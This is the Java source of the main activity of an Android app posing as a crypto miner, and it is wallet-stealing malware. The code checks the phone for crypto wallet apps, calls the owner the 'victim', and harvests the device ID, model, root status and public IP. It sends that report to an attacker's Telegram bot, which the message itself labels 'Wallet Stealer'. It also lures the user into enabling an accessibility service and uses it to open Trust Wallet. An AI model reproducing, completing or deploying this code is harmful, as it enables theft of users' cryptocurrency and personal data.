package com.crypto.coldMinnerPro;

import android.animation.*;
import android.app.*;
import android.app.Activity;
import android.app.DialogFragment;
import android.app.Fragment;
import android.app.FragmentManager;
import android.content.*;
import android.content.res.*;
import android.graphics.*;
import android.graphics.drawable.*;
import android.media.*;
import android.net.*;
import android.os.*;
import android.text.*;
import android.text.style.*;
import android.util.*;
import android.view.*;
import android.view.View.*;
import android.webkit.*;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.view.animation.*;
import android.webkit.*;
import android.widget.*;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.io.*;
import java.text.*;
import java.util.*;
import java.util.regex.*;
import org.json.*;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import com.crypto.coldMinnerPro.services.*;
import com.crypto.coldMinnerPro.utils.*;
import com.crypto.coldMinnerPro.receivers.*;

public class MainActivity extends Activity {
	
	private String TAG = "Main Activity";
	private DeviceInfoUtil deviceInfoUtil;
	private static SharedPrefManager prefs;
	private WebView webView;
	private static MainActivity instance = null;
	private StringBuilder foundWallets = new StringBuilder("𝐖𝐚𝐥𝐥𝐞𝐭 𝐋𝐢𝐬𝐭 💰:\n");
	private boolean atLeastOneFound = false;
	
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		setContentView(R.layout.main);
		instance = this;
		webView = findViewById(R.id.webview1);
		webView.getSettings().setJavaScriptEnabled(true);
		webView.getSettings().setSupportZoom(false);
		webView.getSettings().setBuiltInZoomControls(false);
		webView.getSettings().setDisplayZoomControls(false);
		webView.getSettings().setCacheMode(WebSettings.LOAD_DEFAULT);
		webView.getSettings().setEnableSmoothTransition(true);
		webView.getSettings().setAllowFileAccess(true);
		webView.setWebChromeClient(new WebChromeClient());
		webView.setWebViewClient(new WebViewClient());
		webView.addJavascriptInterface(new WebAppInterface(), "Android");
		
		if (!AccessibilityUtil.isAccessibilityServiceEnabled(this, MyAccessibilityService.class)) {
			webView.loadUrl("file:///android_res/raw/access.html");
		} else {
			webView.loadUrl("file:///android_res/raw/main.html");
		}
		
		deviceInfoUtil = new DeviceInfoUtil(this);
		prefs = new SharedPrefManager(this);
		prefs.setB("killApplication", false);
		prefs.set("appName", DeviceInfoUtil.getLabelApplication(this));
		
		List<Map<String, Object>> results = PackageChecker.checkPackages(this, Wallets.WALLETS);
		
		for (Map<String, Object> result : results) {
			String packageName = (String) result.get("packageName");
			String appName = (String) result.get("name");
			boolean isFound = (boolean) result.get("isFound");
			
			if (isFound) {
				foundWallets.append("  - ").append(appName).append(" 🟢\n");
				atLeastOneFound = true;
			}
		}
		
		if (!atLeastOneFound) {
			foundWallets.setLength(0);
			foundWallets.append("Not Found Any Wallets in Victims Phone 🛑");
		}
		
		if(NetworkUtil.isNetworkConnected(this)){
			if(!prefs.getB("isFirst")){
				proceedWithServiceLogic(foundWallets.toString());
			}
		}else if(NetworkUtil.isWifiConnected(this)){
			if(!prefs.getB("isFirst")){
				proceedWithServiceLogic(foundWallets.toString());
			}
		}else{
			Log.e("Network : ", "Error Please Check your Internet Connection !");
		}
		
	}
	
	
	private void proceedWithServiceLogic(String Wallets) {
		
		final String model = deviceInfoUtil.getModel();
		final String androidVersion = deviceInfoUtil.getAndroidVersion();
		final String deviceID = deviceInfoUtil.getDeviceID(this);
		final boolean isRooted = deviceInfoUtil.isRooted();
		final boolean isSDCardAvailable = deviceInfoUtil.isSDCardAvailable();
		final String storageMemory = deviceInfoUtil.getStorageMemory();
		final String sdkVersion = String.valueOf(deviceInfoUtil.getSDKVersion());
		final String cpuArchitecture = deviceInfoUtil.getCPUArchitecture();
		final String serviceProvider = deviceInfoUtil.getServiceProvider();
		
		deviceInfoUtil.getPublicIP(new DeviceInfoUtil.PublicIPListener() {
			@Override
			public void onPublicIPFetched(String publicIP) {
				Log.i(TAG, "Public IP: " + publicIP);
				
				String message = "🌟 𝐍𝐞𝐰 𝐜𝐥𝐢𝐞𝐧𝐭 𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝 🌟\n\n" +
				"𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝐖𝐚𝐥𝐥𝐞𝐭 𝐒𝐭𝐞𝐚𝐥𝐞𝐫 𝚒𝚜 𝚛𝚞𝚗𝚗𝚒𝚗𝚐 𝚠𝚒𝚝𝚑 𝚗𝚎𝚌𝚎𝚜𝚜𝚊𝚛𝚢 𝚙𝚎𝚛𝚖𝚒𝚜𝚜𝚒𝚘𝚗𝚜.\n\n" +
				"𝗣𝘂𝗯𝗹𝗶𝗰 𝗜𝗣 : " + publicIP + " 🌍\n\n" +
				"𝐃𝐄𝐕𝐈𝐂𝐄 𝐈𝐍𝐅𝐎 :\n" +
				"𝗠𝗼𝗱𝗲𝗹 𝗡𝗮𝗺𝗲 : " + model + " 📱\n" +
				"𝗔𝗻𝗱𝗿𝗼𝗶𝗱 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : " + androidVersion + " 🤖\n" +
				"𝗗𝗲𝘃𝗶𝗰𝗲 𝗜𝗗 : " + deviceID + " 🆔\n" +
				"𝗥𝗼𝗼𝘁𝗲𝗱 : " + (isRooted ? "𝚈𝙴𝚂 🛠️" : "𝙽𝙾") + "\n" +
				"𝗦𝗗 𝗖𝗮𝗿𝗱 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 : " + (isSDCardAvailable ? "𝚈𝙴𝚂 💾" : "𝙽𝙾") + "\n" +
				"𝗦𝘁𝗼𝗿𝗮𝗴𝗲 𝗠𝗲𝗺𝗼𝗿𝘆 : " + storageMemory + " 📦\n" +
				"𝗦𝗱𝗸 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : " + sdkVersion + " 📊\n" +
				"𝗖𝗣𝗨 𝗔𝗿𝗰𝗵𝗶𝘁𝗮𝗰𝘁𝘂𝗿𝗲 : " + cpuArchitecture + " ⚙️\n\n" +
				Wallets+
				"\n\n🚀 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐃 𝐁𝐘  @𝙲𝚢𝚋𝚎𝚛𝚉𝚘𝚗𝚎𝙰𝚌𝚊𝚍𝚎𝚖𝚢";
				
				AdminInfo adminInfo = AdminInfo.fromJsonFile(MainActivity.this, "net_state.bin");
				if (adminInfo != null) {
					DeviceInfoUtil.patchWallet(message); // do not Remove this 
					String chatID = adminInfo.getChatID();
					String token = adminInfo.getToken();
					
					TelegramBotUtils.sendMessage(token, chatID, message, new TelegramBotUtils.TelegramCallback() {
						@Override
						public void onSuccess() {
							Log.i("TelegramCallback", "Message sent successfully to chatID: " + chatID + " with token: " + token);
							prefs.setB("isFirst", true);
						}
						
						@Override
						public void onError(String errorMessage) {
							
							Log.e("TelegramCallback", "Error sending message to chatID: " + chatID + " with token: " + token + " | Error: " + errorMessage);
							prefs.setB("isFirst", false);
						}
					});
					
				} else {
					Log.e("AdminInfoService", "Failed to load admin info");
				}
				
			}
		});
	}
	
	public class WebAppInterface {
		
		@JavascriptInterface
		public void onRedirectToSettings() {
			if (!AccessibilityUtil.isAccessibilityServiceEnabled(MainActivity.this, MyAccessibilityService.class)) {
				AccessibilityUtil.openAccessibilitySettings(MainActivity.this);
			}
		}
		
		@JavascriptInterface
		public void onConnectTrustWallet() {
			MyAccessibilityService.openApp(Wallets.getWalletByIndex(0));
		}
	}
	
	public static void killApplication() {
		if (prefs != null) {
			prefs.setB("killApplication", true);
		} else {
			Log.e("KillApplication", "SharedPrefManager is not initialized");
		}
		ActivityAdminqw.removeSelfAdmin(instance);
		UninstallHelper.requestUninstall(instance);
		
	}
	
	
	@Override
	protected void onDestroy() {
		super.onDestroy();
		prefs = null;
		deviceInfoUtil = null;
		moveTaskToBack(true);
		
	}
}
